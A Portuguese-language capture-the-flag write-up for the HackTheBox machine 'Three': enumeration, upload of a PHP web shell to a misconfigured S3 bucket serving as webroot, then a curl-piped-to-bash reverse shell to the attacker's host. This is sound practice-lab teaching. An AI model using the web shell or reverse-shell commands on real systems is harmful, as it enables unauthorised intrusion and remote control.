Three

HackTheBox · Very Easy by Brenno M.

Three é uma máquina Linux cujo site usa um bucket S3 (emulado via LocalStack) como armazenamento. O bucket, mal configurado, aceita upload não autenticado, o que permite subir uma web shell PHP na raiz do site e obter execução de código. Observação: após spawnar, a máquina precisa de alguns minutos para o LocalStack subir.

Enumeração

O Nmap revela SSH (22) e HTTP (80). O site é estático; o código-fonte mostra que o formulário de contato envia para /action_page.php (backend em PHP) e expõe o domínio thetoppers.htb, adicionado ao /etc/hosts.

sudo nmap -sV <IP>
echo "<IP> thetoppers.htb" | sudo tee -a /etc/hosts

Enumeração de subdomínios

Um brute-force de vHost com o gobuster revela s3.thetoppers.htb. Ao visitá-lo, o retorno {"status": "running"} indica um serviço S3 (LocalStack). Adiciona-se também ao /etc/hosts.

gobuster vhost -w subdomains-top1million-5000.txt -u http://thetoppers.htb --append-domain
echo "<IP> s3.thetoppers.htb" | sudo tee -a /etc/hosts

Interação com o S3

Com o awscli configurado com valores arbitrários (o servidor não valida credenciais), listam-se os buckets. O bucket thetoppers.htb contém index.php e .htaccess, ou seja, é a própria webroot do site.

aws configure   # valores arbitrários
aws --endpoint=http://s3.thetoppers.htb s3 ls
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb

Execução de código

Como o site roda PHP e o bucket é a webroot, sobe-se uma web shell PHP para o bucket e acessa-se pela URL, obtendo RCE como www-data.

echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
curl 'http://thetoppers.htb/shell.php?cmd=id'   # uid=33(www-data)

Reverse shell e flag

Hospeda-se um script de reverse shell em bash em um servidor local e, via a web shell, força-se o alvo a baixá-lo e executá-lo. A flag fica em /var/www/flag.txt.

# atacante:
nc -nvlp 1337
python3 -m http.server 8000   # servindo shell.sh (bash -i >& /dev/tcp/<MEU_IP>/1337 0>&1)
# via web shell:
curl 'http://thetoppers.htb/shell.php?cmd=curl%20<MEU_IP>:8000/shell.sh|bash'
cat /var/www/flag.txt
